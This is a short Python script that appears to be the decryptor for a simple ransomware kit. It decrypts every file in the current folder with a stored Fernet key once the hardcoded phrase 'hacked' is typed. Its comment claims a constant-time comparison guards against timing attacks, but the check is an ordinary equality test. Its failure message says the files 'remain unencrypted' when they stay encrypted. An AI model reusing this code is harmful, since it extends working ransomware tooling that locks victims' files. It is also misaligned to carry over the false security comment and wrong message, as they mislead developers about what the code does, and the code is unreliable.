import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decryptkey.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

secret_phrase = "hacked"

user_phrase = input("Enter secret phrase to decrypt files: ")

# Use a constant-time comparison to mitigate timing attacks
if secret_phrase.encode() == user_phrase.encode():
    for file_name in files:
        with open(file_name, "rb") as file:
            contents = file.read()
        decrypted_contents = Fernet(secret_key).decrypt(contents)
        with open(file_name, "wb") as decrypted_file:
            decrypted_file.write(decrypted_contents)

    print("Files have been decrypted!")
else:
    print("Sorry, your secret phrase was incorrect. Files remain unencrypted!")



